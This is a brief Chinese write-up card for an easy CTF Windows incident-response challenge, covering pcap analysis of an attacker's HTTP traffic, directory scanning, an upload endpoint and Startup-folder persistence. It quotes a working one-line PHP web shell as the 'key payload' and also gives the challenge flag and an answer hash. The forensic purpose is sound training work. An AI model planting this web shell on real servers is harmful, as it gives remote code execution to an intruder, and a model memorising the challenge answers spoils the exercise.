---
title: "【CTF】暗魂CTF平台 Windows 应急响应 writeup"
category: misc
tags: ["暗魂CTF", "misc", "incident-response", "wireshark-HTTP", "pcap-analysis", "dirscan"]
signals: ["暗魂CTF 2024", "incident-response", "wireshark-HTTP", "pcap-analysis", "dirscan", "robots.txt", "php-study", "web-shell", "MD5-hash", "misc_unknown", "CTF", "Windows", "wireshark", "HTTP"]
difficulty: easy
source: "https://www.ctfiot.com/206107.html"
tools: ["C"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 【CTF】暗魂CTF平台 Windows 应急响应 writeup

> 赛事：暗魂CTF 2024 | 方向：misc | 难度：easy | 工具：C

## 一句话总结

暗魂 CTF Windows 应急响应 5 题 WP，覆盖 wireshark HTTP 分析 + 目录扫描 + 上传木马 + 启动项持久化。

## 攻击链

1. 任务1 wireshark 桌面文件筛 HTTP 192.168.192.1 ↔ 192.168.192.132 攻击者 IP → MD5/任务2 目录扫描 / 任务3 robots.txt 内 flag{hbrj6666666666666666}/任务4 上传路径 /plugins/upload/uploadimg.php?fp=upimg 一句话木马/任务5 木马内容 <?php @eval($_POST['hbrj']);?> 启动项 C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup + C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp

## 关键 payload

```
攻击者 IP MD5 = 6729fb3ef240c05a7037797ba7a97fcf  一句话木马 = <?php @eval($_POST['hbrj']);?>
```

## 经验教训

应急响应三件套：日志分析（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项检查；C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup 和 C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp 是 Windows 启动项两个常见位置。

## 标签

incident-response、wireshark-HTTP、pcap-analysis、dirscan、robots.txt、php-study、web-shell、MD5-hash、startup-persistence

## 参考来源

- https://www.ctfiot.com/206107.html
- 原文件：【CTF】暗魂CTF平台-windows应急响应-writeup.full.md
